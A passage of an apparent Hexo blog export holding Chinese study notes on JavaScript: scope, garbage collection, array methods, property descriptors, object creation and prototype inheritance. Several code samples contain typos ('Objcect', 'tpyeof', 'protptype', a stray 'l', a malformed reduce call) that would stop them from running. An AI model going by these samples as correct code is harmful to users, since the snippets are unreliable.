SubType(); \nalert(instance.getSuperValue()); //false \n\n```\n\n##### Notice!!!\n\n使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；\n\n```js\nfunction SuperType(){ \n this.property = true; \n} \nSuperType.prototype.getSuperValue = function(){ \n return this.property; \n}; \nfunction SubType(){ \n this.subproperty = false; \n} \n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//使用字面量添加新方法，会导致上一行代码无效\nSubType.prototype = { \n getSubValue : function (){ \n return this.subproperty; \n }, \n someOtherMethod : function (){ \n return false; \n } \n}; \nvar instance = new SubType(); \nalert(instance.getSuperValue()); //error! \n```\n\n- 原型链的问题\n\n> 问题来自于包含引用类型值的原型；\n>\n> 包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；\n>\n> 在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.colors=['red','grenn']l\n}\n\nfunction SubType(){\n    \n}\n\n//子类原型设为父类\nSubType.protptype=new SuperType();\nvar instance1=new SubType();\n//所有的子都会共享colors；\ninstance1.colors.push('black');\nalert(instance1.colors);\t\t\t//red\\gren\\black\n\nvar instance2=new SubType();\nalert(instance2.colors);\t\t\t//red\\green\\black\n```\n\n#### （2）借用构造函数\n\n> 伪造对象或者经典继承；\n>\n> 在子类构造函数的内部调用超类型构造函数；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.colors=['red','grenn']l\n}\n\nfunction SubType(){\n    SuperType.call(this);\t//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；\n}\n\nvar ins=new SubType();\nins.colors.push(\"black\");\nconsole.log(ins.colors);\t//red.green.black;\nvar ins2=new SubType();\nconsole.log(ins2.colors);\t//red.green;\t//不会共享colors了；\n\n```\n\n##### 传递参数\n\n> 相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.name=name;\n}\n\nfunction SubType(){\n    SuperType.call(this,\"Martin\");\t\t//调用父类构造函数实际上为子类的实例设置了name属性；\n    this.age=29;\t\t//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；\n}\n\nvar ins=new SubType();\nconsole.log(ins.name);\t\t//Martin\nconsole.log(ins.age);\t\t//29\n\n```\n\n##### 问题\n\n> 仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；\n>\n> 超类原型定义的方法对子类而言也是不可见得；\n\n#### （3）组合继承\n\n> 组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；\n>\n> 背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/JS基础.md","raw":"---\ntitle: Vue笔记\ndate: 2022-09-12 2:51:45\ncategories: \n    - 前端\ntags: \n    - JS\n    - 笔记\nmp3: \ncover: img/vue.png\n---\n\n# JS高级程序设计\n\n## 一、基础基础基础\n\n### 1.基础语法\n\n- for-in\n\n```js\n//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；\nfor(property in expression){\n    statement;\n}\n\nfor(var propName in window){\n    document.write(propName);\n}\n```\n\n- with\n\n```js\n//将代码的作用域设置到一个特定的对象中\nwith(expression) statement;\n```\n\n### 2.变量、作用域、内存\n\n- ##### 基本类型和引用类型的值\n\n基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；\n\n引用类型的值是保存在内存中的对象；\n\n与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；\n\n- ##### 复制变量值\n\n从一个变量向另一个变量复制基本类型和引用类型时存在不同；\n\n复制基本类型会创建基本类型的副本：\n\n![](https://s3.bmp.ovh/imgs/2023/03/03/7a78a945b6267d99.jpg)\n\n当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；\n\n复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；\n\n![](https://s3.bmp.ovh/imgs/2023/03/03/18376e88b0eb8200.jpg)\n\n- ##### 传递参数\n\nES中所有的参数都是按值传递的；\n\n```js\nfunction add(num){\n    num+=10;\n    return num;\n}\n\nvar count=20;\nvar result=add(count);\n\n//result=30,count=20不变\n//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。\n```\n\n- 检测类型\n\n要检测一个变量是不是基本类型？（typeof)\n\n检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;\n\n```js\ntpyeof s;\nvariable instanceof constructor\n```\n\n- 作用域\n\nWeb浏览器中，全局执行环境被认为是window对象；\n\n每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；\n\n代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；\n\n- 延长作用域链\n\n有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；\n\n```\ntry-catch语句的catch\nwith语句\n```\n\n### 3.垃圾收集\n\nJS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。\n\n原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；\n\n- 标记清除\n\n当变量进入环境，标记为进入环境，方法可能是设置标志位；\n\n- 引用计数\n\n记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；\n\n一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；\n\n问题：\n\n```js\nfunction problem(){\n    var objA=new Object();\n    var objB=new object();\n    \n    objectA.someOtherObject=objectB;\n    objectA.anotherObject=objectA;\n}\n```\n\nObjectA和B通过各自的属性相互引用，两个对象的引用次数都是2；\n\n这会导致函数执行后继续存在，引用次数永远不会为0；\n\n```js\n//解决方法\nobjA.someOther..=null;\nobjB.ano..=null;\n```\n\n- 性能问题\n- 引用解除\n\n```js\nfunction createPerson(name){ \n var localPerson = new Object(); \n localPerson.name = name; \n return localPerson; \n} \nvar globalPerson = createPerson(\"Nicholas\"); \n// 手工解除 globalPerson 的引用\nglobalPerson = null; \n\n```\n\n### 4.引用类型\n\n- 使用对象\n- 创建、操作数组\n- 理解基本的JS类型\n- 使用基本类型和基本包装类型\n\n> 引用类型的值（对象）是引用类型的一个实例；\n\n- ##### Object类型\n\n```js\n//创建Object实例\n//1.new操作符后跟Object构造函数\nvar person=new Object();\nperson.name=\"Martin\";\nperson.age=29;\n\n//2.对象字面量表示法\nvar person={\n    name:\"Martin\",\n    age:29,\n    \"address\":\"江苏省东南大学\"\t\t\t//属性名可以使用字符串，最后一个属性后不加逗号，会在早的版本导致错误\n}\n\n\n```\n\n- ##### Array类型\n\n```js\n//ES的数组每一项可以保存不同类型的数据；大小动态调整；\n\n//创建方式\n//1.Array构造函数；\nvar colors=new Array(20);\nvar colors=new Array(\"red\",\"blue\",\"yellow\");\n//也可以省略new\nvar colors=Array(3);\n\n//2.数组字面量表示法 \nvar colors=[\"red\",\"blue\",\"yellow\"];\n\nvar nums=[1,2,]\t\t//不要这样！！！\nvar options=[，，，] //不要这样；\n\n//添加元素\ncolor[color.length]=\"black\";\n\n//检测数组instanceof 问题在于如果存在两个不同的Array构造函数，会出错；\nif(value instanceof Array){\n    ...\n}\n    \n//更好的方法\nif(Array.isArray(value)){\n    ...\n}\n```\n\n```js\n//转换方法\nvar colors = [\"red\", \"blue\", \"green\"]; // 创建一个包含 3 个字符串的数组\nalert(colors.toString()); // red,blue,green \nalert(colors.valueOf()); // red,blue,green \nalert(colors); // red,blue,green。由于 alert()要接收字符串参数，所以它会在后台调用 toString()方法，由此会得到与直接调用 toString()方法相同的结果\n\n//栈方法\narray.push();\t\t//尾部压入\narray.pop();\t\t//尾部弹出\n\n//队列方法\narray.push();\t\t//尾部入队\narray.shift();\t\t//首部出队\narray.unshift();\t//首部入队\n\n//重排序方法\narray.sort();\t\t//升序排列，方法会调用每个数组项的 toString()转型方法，然后比较得到的字符串\narray.reverse();\t//反转数组\n\n//sort方法可以接受一个比较函数\nfunction compare(value1, value2) { \n if (value1 < value2) { \n return 1; \n } else if (value1 > value2) { \n return -1; \n } else { \n return 0; \n } \n} \nvar values = [0, 1, 5, 10, 15]; \nvalues.sort(compare); \nalert(values); // 15,10,5,1,0\n\n```\n\n```js\n//操作方法\n//concat（）方法基于当前数组项创建一个新的数组；\nvar colors=[\"red\",\"yellow\"];\nvar colors2=colors.concat(\"green\",[\"blue\",\"grey\"]);\n\n//slice（）方法接受一或者两个参数，为岂止位置；\n//slice方法不会影响原始数组；\nvar colors = [\"red\", \"green\", \"blue\", \"yellow\", \"purple\"]; \nvar colors2 = colors.slice(1); \nvar colors3 = colors.slice(1,4); \n\n//splice()方法\nsplice(0,2);  //删除前两项\nsplice(2,0,\"red\",\"green\")  //从位置2开始插入red,green;\nsplice(2,1,\"red\")\t\t\t//替换第二项为red；\n```\n\n```js\n//位置方法\nindexOf()\t\t\t//从头开始查找\nlastIndexOf()\t\t//从尾部开始查找\n\n\n```\n\n### 5.迭代方法\n\n- every():对数组中的每一项运行给定函数，如果该函数对每一项都返回 true，则返回 true。\n- some()：对数组中的每一项运行给定函数，如果该函数对任一项返回 true，则返回 true。\n- filter():对数组中的每一项运行给定函数，返回该函数会返回 true 的项组成的数组.\n- foreach():：对数组中的每一项运行给定函数。这个方法没有返回值。\n- map()：对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组。\n\n### 6.归并方法\n\n```js\n//reduce():从第一项开始遍历；\n//reduceRight():从最后一项开始遍历；\n//接受的参数：prev,next，索引，数组对象\nvar values=[1,2,3,4,5];\n//第一次调用，pre=1.cur=2;第二次：pre=3(1+2的结果)，cur=3\nvar sum=values.reduce(function(prev,cur,index,array)=>{\n                      return prev+cur;\n                      });\nalert(sum);\t\t\t\t//15\n\n```\n\n### 7.正则表达式\n\n\n\n## 二、面向对象的程序设计\n\n- 理解对象属性\n- 理解并创建对象\n- 理解继承\n\n### 1.属性类型\n\n> ES中有两种属性：数据属性和访问器属性\n\n- 数据属性\n\n> 数据属性包含一个数据值的位置，在这个位置可以读取和写入值。\n>\n> 1. Configurable：表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\n> 2. Enumerable：表示是否可以通过for-in循环返回属性；默认为true;\n> 3. Writable:表示能否修改属性的值；默认为true；\n> 4. Value:数据值，默认为undefined；\n\n```js\nvar person={};\nObjcect.defineProperty(person.\"name\",{\n                       configuable:false,\t\t//一旦设置为false,就不能变回可配置的了；\n                       writable:false,\n                       value:\"Martin\"，\n                       });\nconsole.log(person.name);\t\t//\"Martin\"\nperson.name=\"Jack\";\t\t\t\t//无法修改，非严格模式下赋值会被忽略；严格模式下，抛出错误；\n```\n\n- 访问器属性\n\n> 不包含数据值，包含一对儿~~\n>\n> getter()和setter();\n>\n> 1. configurable:表示是否能通过delete删除属性从而重新定义属性，能否修改属性的特性，能否把属性修改为访问器属性；默认为true；\n> 2. Enumerable：表示是否可以通过for-in循环返回属性；默认为true;\n> 3. Get:读取属性时调用，默认undefined；\n> 4. Set:写入属性时调用，默认undefined；\n\n```js\nvar book={\n    _year:2004,\t\t\t//前置下划线表示只可以通过对象方法访问；\n    edition:1\n};\n\nObjcect.defineProperty(book,\"year\",{\n    get:function(){\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n    },\n    set:function(newValue){\n        if(newValue>2004){\n            this._year=newValue;\n            this.edition+=newValue-2004;\n        }\n    }\n});\n\n//定义多个属性\nObject.defineProperties(book,{\n    _year:{\n        value:2004,\n    },\n    edition:{\n        value:1\n    },\n    year:{\n       get:function(){\t\t\t\t\t\t//只写getter意味着不能写，写入会被忽略；严格模式报错；\n        return this._year;\n        },\n        set:function(newValue){\n            if(newValue>2004){\n                this._year=newValue;\n                this.edition+=newValue-2004;\n            }\n        }\n    }\n})\n\n```\n\n```js\n//读取属性的特性\nvar year=Object.getOwnPropertyDescriptor(book,\"_year\");\nconsole.log(year.value);\n```\n\n### 2.创建对象\n\n> 工厂模式抽象了具体创建对象的过程，考虑到ES中无法创建类，开发人员就发明了一i中函数\n\n##### 工厂模式\n\n```js\nfunction createPerson(name,age,job){\n    var o=new Objcet();\n    o.name=name;\n    o.age=age;\n    o.job=job;\n    o.sayName=function(){\n        console.log(this.name);\n    };\n    return o;\n}\n```\n\n> 工厂模式虽然解决了创建多个相似对象的问题，但是没有解决对象识别的问题，无法知道一个对象的类型；\n\n##### 构造函数模式\n\n> ES中的构造函数能船舰特定类型的对象；\n>\n> 像Object和Array这样的原生构造函数，运行时会自动出现再执行环境；\n\n```js\nfunction Person(name,age,job){\n    this.name=name;\n    this.age=age;\n    this.job=job;\n    \n    this.sayName=function(){\n        console.log(this.name);\n    }\n}\n```\n\n除了相同部分，有如下区别：\n\n- 没有显式的创建对象；\n- 直接将属性和方法赋给了this对象；\n- 没有return；\n\nNote：构造函数使用应该使用首字母大写的开头，非构造函数小写字母开头；\n\n```js\n//要创建Person实例，需要使用new\nlet newPerson=new Person(\"Martin\",18,\"Programmer\");\nconsole.log(newPerson.constructor==Person);   //true\nconsole.log(newPerson instanceof Person);\t//true\n```\n\n> 创建自定义的构造函数意味着将来可以将他的实例标识为一种特定的类型；\n>\n> 构造函数虽然好用，但是也不是没有缺点。\n>\n> 主要问题是：每个方法都要再实例上重新创建一遍；\n>\n> 不同实例创建相同函数名的函数，会导致不同的作用域链和标识符解析。\n>\n> 创建相同的Function实例完全没有必要，况且有this对象在根本不用在执行代码前九八函数绑定到特定的对象上面；\n\n```js\n//优化方法\nfunction Person(name,age){\n    this.name=name;\n    this.age=age;\n    \n    this.sayName=sayName;\n}\n\nfunction sayName(){\n    console.log(this.name);\n}\n```\n\n> 构造函数内部将sayName属性设置成全局的sayName函数。\n>\n> 新的问题：虽然方法定义在全局作用域，但实际上只能被某个对象调用，让全局作用域名不副实；\n>\n> 更进一步，如果一个对象需要定义很多方法，则需要定义多个全局函数，失去封装性；\n\n##### 原型模式\n\n> 我们创建的每个函数都有一个prototype属性，这个属性是一个指针，指向一个对象。\n>\n> Prototype就是通过调用构造函数而创建的那个对象实例的原型对象；\n>\n> 使用原型对象的好处是可以让所有对象实例共享它所包含的属性和方法，即不用再构造函数中定义对象实例的信息，而是将这些信息直接添加到原型对象中；\n\n```js\nfunction Person(){\n    \n}\n\nPerson.prototype.name=\"Martin\";\nPerson.prototype.age=23;\nPerson.prototype.sayName=function(){\n    console.log(this.name);\n};\n\nvar person1=new Person();\nvar person2=new Person();\nperson1.name=\"Martin\"\nperson2.name=\"Jack\"\nperson1.sayName();   //\"Martin\"\nperson2.sayName();\t//\"Jack\"\n\nconsole.log(person1.sayName()==person2.sayName())\t//true\n```\n\n##### 理解原型对象\n\n> 无论什么时候，只要创建了新韩淑，会为这个函数创建一个prototype属性，这个属性指向函数的原型对象。\n>\n> 默认情况下，所有原型对象都会自动获得一个constructor属性，这个属性包含一个指向prototype属性所在函数的指针。\n>\n> 举前面的例子：\n>\n> Person.prototype.constructor指向Person，通过这个构造函数可以伪原型对象添加其他属性；\n\n![](https://s3.bmp.ovh/imgs/2023/03/08/953a324fdcd4fa42.png)\n\n> 当为对象实例添加一个属性时，属性会屏蔽原型对象中保存的同名属性；\n>\n> 原型对象中的属性值不变；只会修改实例中的属性；\n>\n> 使用delete操作符可以完全删除实例属性，达到访问原型属性值的目的；\n>\n> 使用hasOwnProperty()来检查属性值是来自于原型还是实例；\n\n![](https://s3.bmp.ovh/imgs/2023/03/08/b6a6f03230b36450.png)\n\n##### 原型与in操作符\n\n> 有两种方式使用in操作符：单独使用和for-in循环使用；\n>\n> 单独使用：通过对象能返回给定属性时返回true（不论原型和实例）；hasOwnProperty()只适用于实例；\n>\n> tips:如果in返回true而hasOwnProperty()返回false，可以确定属性是原型中的属性；\n>\n> for-in中使用：返回的是通过对象访问的，可以枚举的属性；\n\n```js\n//获得对象上所有的可枚举实例\nobject.keys();\n\nvar p=new Person();\nvar pKeys=Obcject.keys(p);\n```\n\n##### 更简单的原型语法\n\n```js\n//简写prototype\nfunction Person(){}\n\nPerson.prototype={\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function(){\n        alert(this.name);\n    }\n};\n\n//上面的代码里，将Person.prototype设置为一个字面量创建的新对象；但是此时constructor不再指向Person了；\n//每创建一个函数，同时会创建他的prototype对象，这个对象自动获得constructor属性；\nPerson.prototype={\n    constructor:Person,\n    name:\"Martin\",\n    age:29,\n    job:\"Software Engineer\",\n    sayName:function(){\n        alert(this.name);\n    }\n};\n```\n\n##### 组合使用：构造函数模式和原型模式\n\n> 构造函数用于定义实例属性；原型模式用于定义方法和共享属性；\n>\n> 共享方法，但是每个实例有自己的属性副本；\n\n```js\nfunction Person(name, age, job){ \n this.name = name; \n this.age = age; \n this.job = job; \n this.friends = [\"Shelby\", \"Court\"]; \n} \nPerson.prototype = { \n constructor : Person, \n sayName : function(){ \n alert(this.name); \n } \n} \n```\n\n##### 动态原型模式\n\n> 通过将所有信息封装到构造函数，再构造函数中初始化原型；\n\n```js\nfunction Person(name, age, job){ \n this.name = name; \n this.age = age; \n this.job = job; \n    if(typeof this.sayName!=\"function\"){\n        Person.prototype.sayName=function(){\n            alert(this.name);\n        }\n    }\n} \n```\n\n##### 寄生构造函数\n\n```js\nfunction Person(name, age, job){ \n var o = new Object(); \n o.name = name; \n o.age = age; \n o.job = job; \n o.sayName = function(){ \n alert(this.name); \n }; \n return o; \n} \nvar friend = new Person(\"Nicholas\", 29, \"Software Engineer\"); \nfriend.sayName(); //\"Nicholas\" \n```\n\n### 3.继承\n\n- 接口继承：只继承方法签名；\n- 实现继承：继承实际方法；\n\nES只支持实现继承，主要依靠原型链实现；\n\n#### （1）原型链\n\n> 利用原型让一个引用类型继承另一个引用类型的属性和方法；\n\n```js\n//原型链基本模式\n\nfunction SuperType(){\n    this.property=true;\n}\n\nSuperType.prototype.getSuperValue=function(){\n    return this.property;\n};\n\nfunction SubType(){\n    this.subproperty=false;\n}\n\nSubType.prototype=new SuperType();\t\t//子类的原型是父类的实例；子类获得父类的所有属性和方法；\n\nSubType.prototype.getSubValue=function(){\n    return this.subproperty;\n};\n\nvar instacne=new SubType();\nconsole.log(instacne.getSuperValue());\t\t//true;\n```\n\n![](https://s3.bmp.ovh/imgs/2023/03/11/606aeed6b87048a8.png)\n\n- 别忘记默认的原型\n\n> 所有引用类型都默认继承Object；\n\n![](https://s3.bmp.ovh/imgs/2023/03/11/ccdc684bf208d6d1.png)\n\n- 确定原型和实例的关系\n\n```js\ninstance instanceof Object;\nObjcet.prototype.isPrototypeOf(instance);\n```\n\n- 谨慎的定义代码\n\n> 子类优势需要重写超类中的某个方法，或者添加超累不存在的某个方法；\n>\n> 不管怎样，给原型添加的代码一定要放在替换原型语句之后；\n\n```js\nfunction SuperType(){ \n this.property = true; \n} \nSuperType.prototype.getSuperValue = function(){ \n return this.property; \n}; \nfunction SubType(){ \n this.subproperty = false; \n} \n\n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//!!!!添加新方法\nSubType.prototype.getSubValue = function (){ \n return this.subproperty; \n}; \n//重写超类型中的方法\nSubType.prototype.getSuperValue = function (){ \n return false; \n}; \nvar instance = new SubType(); \nalert(instance.getSuperValue()); //false \n\n```\n\n##### Notice!!!\n\n使用原型链实现继承时，不能使用对象字面量创建原型方法；因为会重写原型链；\n\n```js\nfunction SuperType(){ \n this.property = true; \n} \nSuperType.prototype.getSuperValue = function(){ \n return this.property; \n}; \nfunction SubType(){ \n this.subproperty = false; \n} \n//继承了 SuperType \nSubType.prototype = new SuperType(); \n//使用字面量添加新方法，会导致上一行代码无效\nSubType.prototype = { \n getSubValue : function (){ \n return this.subproperty; \n }, \n someOtherMethod : function (){ \n return false; \n } \n}; \nvar instance = new SubType(); \nalert(instance.getSuperValue()); //error! \n```\n\n- 原型链的问题\n\n> 问题来自于包含引用类型值的原型；\n>\n> 包含引用类型值的原型属性会被所有实例共享，这也是在构造函数而不是在原型对象中定义属性的原因；\n>\n> 在通过原型来实现继承时，原型实际上会变成另一个类型的实例；于是原先实例的属性也就变成了现在的原型属性了；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.colors=['red','grenn']l\n}\n\nfunction SubType(){\n    \n}\n\n//子类原型设为父类\nSubType.protptype=new SuperType();\nvar instance1=new SubType();\n//所有的子都会共享colors；\ninstance1.colors.push('black');\nalert(instance1.colors);\t\t\t//red\\gren\\black\n\nvar instance2=new SubType();\nalert(instance2.colors);\t\t\t//red\\green\\black\n```\n\n#### （2）借用构造函数\n\n> 伪造对象或者经典继承；\n>\n> 在子类构造函数的内部调用超类型构造函数；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.colors=['red','grenn']l\n}\n\nfunction SubType(){\n    SuperType.call(this);\t//继承了supertype；实际上在未来新创建的SubType实例时调用SuperType的构造函数；\n}\n\nvar ins=new SubType();\nins.colors.push(\"black\");\nconsole.log(ins.colors);\t//red.green.black;\nvar ins2=new SubType();\nconsole.log(ins2.colors);\t//red.green;\t//不会共享colors了；\n\n```\n\n##### 传递参数\n\n> 相比于原型链，借用构造函数有一个很大的优势，可以在子类型构造函数中向超累型构造函数传递参数；\n\n```js\n//定义了一个colors属性\nfunction SuperType(){\n    this.name=name;\n}\n\nfunction SubType(){\n    SuperType.call(this,\"Martin\");\t\t//调用父类构造函数实际上为子类的实例设置了name属性；\n    this.age=29;\t\t//为了确保父类构造函数不会重写子类的属性，可以在调用父类构造函数忠厚添加子类定义的属性；\n}\n\nvar ins=new SubType();\nconsole.log(ins.name);\t\t//Martin\nconsole.log(ins.age);\t\t//29\n\n```\n\n##### 问题\n\n> 仅仅借用构造函数，无法避免构造函数模式存在的问题：方法都在构造函数中定义，无法函数复用；\n>\n> 超类原型定义的方法对子类而言也是不可见得；\n\n#### （3）组合继承\n\n> 组合继承：有时叫伪经典继承，指将原型链和借用构造函数的技术组合到一块儿，发挥二者之长的继承模式；\n>\n> 背后的思路是使用原型链实现对原型属性和方法的继承，通过借用构造函数来实现对实例属性的继承；\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"JS基础","published":1,"updated":"2023-04-04T13:35:41.643Z","_id":"clg29vyg9001kao9ccb6egzmx","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"JS高级程序设计\"><a href=\"#JS高级程序设计\" class=\"headerlink\" title=\"JS高级程序设计\"></a>JS高级程序设计</h1><h2 id=\"一、基础基础基础\"><a href=\"#一、基础基础基础\" class=\"headerlink\" title=\"一、基础基础基础\"></a>一、基础基础基础</h2><h3 id=\"1-基础语法\"><a href=\"#1-基础语法\" class=\"headerlink\" title=\"1.基础语法\"></a>1.基础语法</h3><ul>\n<li>for-in</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//for-in语法是一种精准的迭代语句，可以用来枚举对象的属性；</span><br><span class=\"hljs-keyword\">for</span>(property <span class=\"hljs-keyword\">in</span> expression)&#123;<br>    statement;<br>&#125;<br><br><span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">var</span> propName <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable language_\">window</span>)&#123;<br>    <span class=\"hljs-variable language_\">document</span>.<span class=\"hljs-title function_\">write</span>(propName);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>with</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//将代码的作用域设置到一个特定的对象中</span><br><span class=\"hljs-title function_\">with</span>(expression) statement;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-变量、作用域、内存\"><a href=\"#2-变量、作用域、内存\" class=\"headerlink\" title=\"2.变量、作用域、内存\"></a>2.变量、作用域、内存</h3><ul>\n<li><h5 id=\"基本类型和引用类型的值\"><a href=\"#基本类型和引用类型的值\" class=\"headerlink\" title=\"基本类型和引用类型的值\"></a>基本类型和引用类型的值</h5></li>\n</ul>\n<p>基本数据类型（可以直接操作保存在变量中的实际的值）：Undefined、NULL、Boolean、Number、String；</p>\n<p>引用类型的值是保存在内存中的对象；</p>\n<p>与其他语言不同，JS不允许直接访问内存中的位置；在操作对象时，实际操作的是对象的引用；</p>\n<ul>\n<li><h5 id=\"复制变量值\"><a href=\"#复制变量值\" class=\"headerlink\" title=\"复制变量值\"></a>复制变量值</h5></li>\n</ul>\n<p>从一个变量向另一个变量复制基本类型和引用类型时存在不同；</p>\n<p>复制基本类型会创建基本类型的副本：</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/03/7a78a945b6267d99.jpg\"></p>\n<p>当一个变量赋值引用类型的值，同样也会将存储的值复制一份放到新变量分配的空间中国，不同的是，这个值的副本其实是一个指针，而这个指针指向存储在堆中的一个对象；</p>\n<p>复制结束后，两个变量实际上引用同一个对象；因此改变其中一个变量会改变另一个；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/03/03/18376e88b0eb8200.jpg\"></p>\n<ul>\n<li><h5 id=\"传递参数\"><a href=\"#传递参数\" class=\"headerlink\" title=\"传递参数\"></a>传递参数</h5></li>\n</ul>\n<p>ES中所有的参数都是按值传递的；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">num</span>)&#123;<br>    num+=<span class=\"hljs-number\">10</span>;<br>    <span class=\"hljs-keyword\">return</span> num;<br>&#125;<br><br><span class=\"hljs-keyword\">var</span> count=<span class=\"hljs-number\">20</span>;<br><span class=\"hljs-keyword\">var</span> result=<span class=\"hljs-title function_\">add</span>(count);<br><br><span class=\"hljs-comment\">//result=30,count=20不变</span><br><span class=\"hljs-comment\">//这是因为addTen()中的参数num是count的值传递，而不是引用传递两者是相互无关的。</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>检测类型</li>\n</ul>\n<p>要检测一个变量是不是基本类型？（typeof)</p>\n<p>检测基本数据类型时，typeof很好用，但是检测引用类型用处不大，需要使用instanceof;</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">tpyeof s;<br>variable <span class=\"hljs-keyword\">instanceof</span> constructor<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>作用域</li>\n</ul>\n<p>Web浏览器中，全局执行环境被认为是window对象；</p>\n<p>每个函数都有自己的执行环境，当执行流进入一个函数时，函数的环境会被推入一个环境栈中；</p>\n<p>代码在一个环境中执行时，会创建变量对象的一个作用域链（scope chanin）：其作用是为了保证对执行环境有权访问的所有变量和函数有序的访问；</p>\n<ul>\n<li>延长作用域链</li>\n</ul>\n<p>有些语句可以在作用域链的前端临时增加一个变量对象，该变量对象在代码执行后被移除；</p>\n<figure class=\"highlight actionscript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs actionscript\"><span class=\"hljs-keyword\">try</span>-<span class=\"hljs-keyword\">catch</span>语句的<span class=\"hljs-keyword\">catch</span><br><span class=\"hljs-keyword\">with</span>语句<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-垃圾收集\"><a href=\"#3-垃圾收集\" class=\"headerlink\" title=\"3.垃圾收集\"></a>3.垃圾收集</h3><p>JS具有自动垃圾收集机制，执行环境会负责管理代码执行过程中使用的内存。</p>\n<p>原理：找出不再使用的变量，释放内存；垃圾收集器按照固定时间间隔周期性执行；</p>\n<ul>\n<li>标记清除</li>\n</ul>\n<p>当变量进入环境，标记为进入环境，方法可能是设置标志位；</p>\n<ul>\n<li>引用计数</li>\n</ul>\n<p>记录每个值被引用的次数，当声明了一个变量并且将一个引用类型赋给该变量，则这个值的引用次数就是1；</p>\n<p>一个值赋给一个变量，引用次数+1；相反对这个值引用的变量右取得了另一个值，则引用次数-1；</p>\n<p>问题：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">problem</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span 